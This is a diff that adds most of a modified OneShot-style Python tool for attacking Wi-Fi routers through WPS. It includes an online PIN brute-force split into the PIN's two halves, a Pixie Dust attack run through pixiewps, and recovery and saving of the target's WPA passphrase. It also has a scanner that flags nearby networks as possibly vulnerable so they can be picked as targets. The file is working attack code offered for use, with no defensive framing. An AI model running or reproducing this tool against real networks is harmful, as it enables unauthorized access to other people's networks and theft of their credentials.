+            elif self.connection_status.status == 'GOT_PSK':
+                break
+            elif self.connection_status.status == 'WPS_FAIL':
+                break
+
+        self.sendOnly('WPS_CANCEL')
+        return False
+
+    def single_connection(self, bssid, pin=None, pixiemode=False, showpixiecmd=False,
+                          pixieforce=False, store_pin_on_fail=False):
+        if not pin:
+            if pixiemode:
+                try:
+                    # Try using the previously calculated PIN
+                    filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
+                    with open(filename, 'r') as file:
+                        t_pin = file.readline().strip()
+                        if input('[?] Use previously calculated PIN {}? [n/Y] '.format(t_pin)).lower() != 'n':
+                            pin = t_pin
+                        else:
+                            raise FileNotFoundError
+                except FileNotFoundError:
+                    pin = self.generator.getLikely(bssid) or '12345670'
+            else:
+                # If not pixiemode, ask user to select a pin from the list
+                pin = self.__prompt_wpspin(bssid) or '12345670'
+
+        if store_pin_on_fail:
+            try:
+                self.__wps_connection(bssid, pin, pixiemode)
+            except KeyboardInterrupt:
+                print("\nAborting…")
+                self.__savePin(bssid, pin)
+                return False
+        else:
+            self.__wps_connection(bssid, pin, pixiemode)
+
+        if self.connection_status.status == 'GOT_PSK':
+            self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
+            if self.save_result:
+                self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
+            # Try to remove temporary PIN file
+            filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
+            try:
+                os.remove(filename)
+            except FileNotFoundError:
+                pass
+            return True
+        elif pixiemode:
+            if self.pixie_creds.got_all():
+                pin = self.__runPixiewps(showpixiecmd, pixieforce)
+                if pin:
+                    return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
+                return False
+            else:
+                print('[!] Not enough data to run Pixie Dust attack')
+                return False
+        else:
+            if store_pin_on_fail:
+                # Saving Pixiewps calculated PIN if can't connect
+                self.__savePin(bssid, pin)
+            return False
+
+    def __first_half_bruteforce(self, bssid, f_half, delay=None):
+        """
+        @f_half — 4-character string
+        """
+        checksum = self.generator.checksum
+        while int(f_half) < 10000:
+            t = int(f_half + '000')
+            pin = '{}000{}'.format(f_half, checksum(t))
+            self.single_connection(bssid, pin)
+            if self.connection_status.isFirstHalfValid():
+                print('[+] First half found')
+                return f_half
+            elif self.connection_status.status == 'WPS_FAIL':
+                print('[!] WPS transaction failed, re-trying last pin')
+                return self.__first_half_bruteforce(bssid, f_half)
+            f_half = str(int(f_half) + 1).zfill(4)
+            self.bruteforce.registerAttempt(f_half)
+            if delay:
+                time.sleep(delay)
+        print('[-] First half not found')
+        return False
+
+    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
+        """
+        @f_half — 4-character string
+        @s_half — 3-character string
+        """
+        checksum = self.generator.checksum
+        while int(s_half) < 1000:
+            t = int(f_half + s_half)
+            pin = '{}{}{}'.format(f_half, s_half, checksum(t))
+            self.single_connection(bssid, pin)
+            if self.connection_status.last_m_message > 6:
+                return pin
+            elif self.connection_status.status == 'WPS_FAIL':
+                print('[!] WPS transaction failed, re-trying last pin')
+                return self.__second_half_bruteforce(bssid, f_half, s_half)
+            s_half = str(int(s_half) + 1).zfill(3)
+            self.bruteforce.registerAttempt(f_half + s_half)
+            if delay:
+                time.sleep(delay)
+        return False
+
+    def smart_bruteforce(self, bssid, start_pin=None, delay=None):
+        if (not start_pin) or (len(start_pin) < 4):
+            # Trying to restore previous session
+            try:
+                filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
+                with open(filename, 'r') as file:
+                    if input('[?] Restore previous session for {}? [n/Y] '.format(bssid)).lower() != 'n':
+                        mask = file.readline().strip()
+                    else:
+                        raise FileNotFoundError
+            except FileNotFoundError:
+                mask = '0000'
+        else:
+            mask = start_pin[:7]
+
+        try:
+            self.bruteforce = BruteforceStatus()
+            self.bruteforce.mask = mask
+            if len(mask) == 4:
+                f_half = self.__first_half_bruteforce(bssid, mask, delay)
+                if f_half and (self.connection_status.status != 'GOT_PSK'):
+                    self.__second_half_bruteforce(bssid, f_half, '001', delay)
+            elif len(mask) == 7:
+                f_half = mask[:4]
+                s_half = mask[4:]
+                self.__second_half_bruteforce(bssid, f_half, s_half, delay)
+            raise KeyboardInterrupt
+        except KeyboardInterrupt:
+            print("\nAborting…\nStay With\nTanvir\nHasan")
+            filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
+            with open(filename, 'w') as file:
+                file.write(self.bruteforce.mask)
+            print('[i] Session saved in {}'.format(filename))
+            if args.loop:
+                raise KeyboardInterrupt
+
+    def cleanup(self):
+        self.retsock.close()
+        self.wpas.terminate()
+        os.remove(self.res_socket_file)
+        shutil.rmtree(self.tempdir, ignore_errors=True)
+        os.remove(self.tempconf)
+
+    def __del__(self):
+        self.cleanup()
+
+
+class WiFiScanner:
+    """docstring for WiFiScanner"""
+    def __init__(self, interface, vuln_list=None):
+        self.interface = interface
+        self.vuln_list = vuln_list
+
+        reports_fname = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.csv'
+        try:
+            with open(reports_fname, 'r', newline='', encoding='utf-8', errors='replace') as file:
+                csvReader = csv.reader(file, delimiter=';', quoting=csv.QUOTE_ALL)
+                # Skip header
+                next(csvReader)
+                self.stored = []
+                for row in csvReader:
+                    self.stored.append(
+                        (
+                            row[1],   # BSSID
+                            row[2]    # ESSID
+                        )
+                    )
+        except FileNotFoundError:
+            self.stored = []
+
+    def iw_scanner(self) -> Dict[int, dict]:
+        """Parsing iw scan results"""
+        def handle_network(line, result, networks):
+            networks.append(
+                    {
+                        'Security type': 'Unknown',
+                        'WPS': False,
+                        'WPS locked': False,
+                        'Model': '',
+                        'Model number': '',
+                        'Device name': ''
+                     }
+                )
+            networks[-1]['BSSID'] = result.group(1).upper()
+
+        def handle_essid(line, result, networks):
+            d = result.group(1)
+            networks[-1]['ESSID'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+
+        def handle_level(line, result, networks):
+            networks[-1]['Level'] = int(float(result.group(1)))
+
+        def handle_securityType(line, result, networks):
+            sec = networks[-1]['Security type']
+            if result.group(1) == 'capability':
+                if 'Privacy' in result.group(2):
+                    sec = 'WEP'
+                else:
+                    sec = 'Open'
+            elif sec == 'WEP':
+                if result.group(1) == 'RSN':
+                    sec = 'WPA2'
+                elif result.group(1) == 'WPA':
+                    sec = 'WPA'
+            elif sec == 'WPA':
+                if result.group(1) == 'RSN':
+                    sec = 'WPA/WPA2'
+            elif sec == 'WPA2':
+                if result.group(1) == 'WPA':
+                    sec = 'WPA/WPA2'
+            networks[-1]['Security type'] = sec
+
+        def handle_wps(line, result, networks):
+            networks[-1]['WPS'] = result.group(1)
+
+        def handle_wpsLocked(line, result, networks):
+            flag = int(result.group(1), 16)
+            if flag:
+                networks[-1]['WPS locked'] = True
+
+        def handle_model(line, result, networks):
+            d = result.group(1)
+            networks[-1]['Model'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+
+        def handle_modelNumber(line, result, networks):
+            d = result.group(1)
+            networks[-1]['Model number'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+
+        def handle_deviceName(line, result, networks):
+            d = result.group(1)
+            networks[-1]['Device name'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+
+        cmd = 'iw dev {} scan'.format(self.interface)
+        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
+                              stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
+        lines = proc.stdout.splitlines()
+        networks = []
+        matchers = {
+            re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
+            re.compile(r'SSID: (.*)'): handle_essid,
+            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
+            re.compile(r'(capability): (.+)'): handle_securityType,
+            re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
+            re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
+            re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
+            re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
+            re.compile(r' [*] Model: (.*)'): handle_model,
+            re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
+            re.compile(r' [*] Device name: (.*)'): handle_deviceName
+        }
+
+        for line in lines:
+            if line.startswith('command failed:'):
+                print('[!] Error:', line)
+                return False
+            line = line.strip('\t')
+            for regexp, handler in matchers.items():
+                res = re.match(regexp, line)
+                if res:
+                    handler(line, res, networks)
+
+        # Filtering non-WPS networks
+        networks = list(filter(lambda x: bool(x['WPS']), networks))
+        if not networks:
+            return False
+
+        # Sorting by signal level
+        networks.sort(key=lambda x: x['Level'], reverse=True)
+
+        # Putting a list of networks in a dictionary, where each key is a network number in list of networks
+        network_list = {(i + 1): network for i, network in enumerate(networks)}
+
+        # Printing scanning results as table
+        def truncateStr(s, length, postfix='…'):
+            """
+            Truncate string with the specified length
+            @s — input string
+            @length — length of output string
+            """
+            if len(s) > length:
+                k = length - len(postfix)
+                s = s[:k] + postfix
+            return s
+
+        def colored(text, color=None):
+            """Returns colored text"""
+            if color:
+                if color == 'green':
+                    text = '\033[92m{}\033[00m'.format(text)
+                elif color == 'red':
+                    text = '\033[91m{}\033[00m'.format(text)
+                elif color == 'yellow':
+                    text = '\033[93m{}\033[00m'.format(text)
+                else:
+                    return text
+            else:
+                return text
+            return text
+
+        if self.vuln_list:
+            print('Network marks: {1} {0} {2} {0} {3}'.format(
+                '|',
+                colored('Possibly vulnerable', color='green'),
+                colored('WPS locked', color='red'),
+                colored('Already stored', color='yellow')
+            ))
+        print('Networks list:')
+        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
+            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'WSC device name', 'WSC model'))
+
+        network_list_items = list(network_list.items())
+        if args.reverse_scan:
+            network_list_items = network_list_items[::-1]
+        for n, network in network_list_items:
+            number = f'{n})'
+            model = '{} {}'.format(network['Model'], network['Model number'])
+            essid = truncateStr(network['ESSID'], 25)
+            deviceName = truncateStr(network['Device name'], 27)
+            line = '{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
+                number, network['BSSID'], essid,
+                network['Security type'], network['Level'],
+                deviceName, model
+                )
+            if (network['BSSID'], network['ESSID']) in self.stored:
+                print(colored(line, color='yellow'))
+            elif network['WPS locked']:
+                print(colored(line, color='red'))
+            elif self.vuln_list and (model in self.vuln_list):
+                print(colored(line, color='green'))
+            else:
+                print(line)
+
+        return network_list
+
+    def prompt_network(self) -> str:
+        networks = self.iw_scanner()
+        if not networks:
+            print('[-] No WPS networks found.')
+            return
+        while 1:
+            try:
+                networkNo = input('Select target (press Enter to refresh): ')
+                if networkNo.lower() in ('r', '0', ''):
+                    return self.prompt_network()
+                elif int(networkNo) in networks.keys():
+                    return networks[int(networkNo)]['BSSID']
+                else:
+                    raise IndexError
+            except Exception:
+                print('Invalid number')
+
+
+def ifaceUp(iface, down=False):
+    if down:
+        action = 'down'
+    else:
+        action = 'up'
+    cmd = 'ip link set {} {}'.format(iface, action)
+    res = subprocess.run(cmd, shell=True, stdout=sys.stdout, stderr=sys.stdout)
+    if res.returncode == 0:
+        return True
+    else:
+        return False
+
+
+def die(msg):
+    sys.stderr.write(msg + '\n')
+    sys.exit(1)
+
+
+def usage():
+    return """
+OneShotPin 0.0.2 (c) 2017 rofl0r, modded by BiRi_B@B@
+
+%(prog)s <arguments>
+
+Required arguments:
+    -i, --interface=<wlan0>  : Name of the interface to use
+
+Optional arguments:
+    -b, --bssid=<mac>        : BSSID of the target AP
+    -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
+    -K, --pixie-dust         : Run Pixie Dust attack
+    -B, --bruteforce         : Run online bruteforce attack
+
+Advanced arguments:
+    -d, --delay=<n>          : Set the delay between pin attempts [0]
+    -w, --write              : Write AP credentials to the file on success
+    -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
+    -X, --show-pixie-cmd     : Always print Pixiewps command
+    --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
+    --iface-down             : Down network interface when the work is finished
+    -l, --loop               : Run in a loop
+    -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
+    -v, --verbose            : Verbose output
+
+Example:
+    %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K
+"""
+
+
+if __name__ == '__main__':
+    import argparse
+
+    parser = argparse.ArgumentParser(
+        description='OneShotPin 0.0.2 (c) 2017 rofl0r, modded by BiRi_B@B@',
+        epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K'
+        )
+
+    parser.add_argument(
+        '-i', '--interface',
+        type=str,
+        required=True,
+        help='Name of the interface to use'
+        )
+    parser.add_argument(
+        '-b', '--bssid',
+        type=str,
+        help='BSSID of the target AP'
+        )
+    parser.add_argument(
+        '-p', '--pin',
+        type=str,
+        help='Use the specified pin (arbitrary string or 4/8 digit pin)'
+        )
+    parser.add_argument(
+        '-K', '--pixie-dust',
+        action='store_true',
+        help='Run Pixie Dust attack'
+        )
+    parser.add_argument(
+        '-F', '--pixie-force',
+        action='store_true',
+        help='Run Pixiewps with --force option (bruteforce full range)'
+        )
+    parser.add_argument(
+        '-X', '--show-pixie-cmd',
+        action='store_true',
+        help='Always print Pixiewps command'
+        )
+    parser.add_argument(
+        '-B', '--bruteforce',
+        action='store_true',
+        help='Run online bruteforce attack'
+        )
+    parser.add_argument(
+        '-d', '--delay',
+        type=float,
+        help='Set the delay between pin attempts'
+        )
+    parser.add_argument(
+        '-w', '--write',
+        action='store_true',
+        help='Write credentials to the file on success'
+        )
+    parser.add_argument(
+        '--iface-down',
+        action='store_true',
+        help='Down network interface when the work is finished'
+        )
+    parser.add_argument(
+        '--vuln-list',
+        type=str,
+        default=os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt',
+        help='Use custom file with vulnerable devices list'
+    )
+    parser.add_argument(
+        '-l', '--loop',
+        action='store_true',
+        help='Run in a loop'
+    )
+    parser.add_argument(
+        '-r', '--reverse-scan',
+        action='store_true',
+        help='Reverse order of networks in the list of networks. Useful on small displays'
+    )
+    parser.add_argument(
+        '-v', '--verbose',
+        action='store_true',
+        help='Verbose output'
+        )
+
+    args = parser.parse_args()
+
+    if sys.hexversion < 0x03060F0:
+        die("The program requires Python 3.6 and above")
+    if os.getuid() != 0:
+        die("Run it as root")
+
+    if not ifaceUp(args.interface):
+        die('Unable to up interface "{}"'.format(args.interface))
+
+    while True:
+        try:
+            if not args.bssid:
+                try:
+                    with open(args.vuln_list, 'r', encoding='utf-8') as file:
+                        vuln_list = file.read().splitlines()
+                except FileNotFoundError:
+                    vuln_list = []
+                scanner = WiFiScanner(args.interface, vuln_list)
+                if not args.loop:
+                    print('[*] BSSID not specified (--bssid) — scanning for available networks')
+                args.bssid = scanner.prompt_network()
+
+            if args.bssid:
+                companion = Companion(args.interface, args.write, print_debug=args.verbose)
+                if args.bruteforce:
+                    companion.smart_bruteforce(args.bssid, args.pin, args.delay)
+                else:
+                    companion.single_connection(args.bssid, args.pin, args.pixie_dust,
+                                                args.show_pixie_cmd, args.pixie_force)
+            if not args.loop:
+                break
+            else:
+                args.bssid = None
+        except KeyboardInterrupt:
+            if args.loop:
+                if input("\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ").lower() == 'y':
+                    print("Aborting…\nStay With\nTanvir\nHasan")
+                    break
+                else:
+                    args.bssid = None
+            else:
+                print("\nAborting…\nStay With\nTanvir\nHasan")
+                break
+
+    if args.iface_down:
+        ifaceUp(args.interface, down=True)
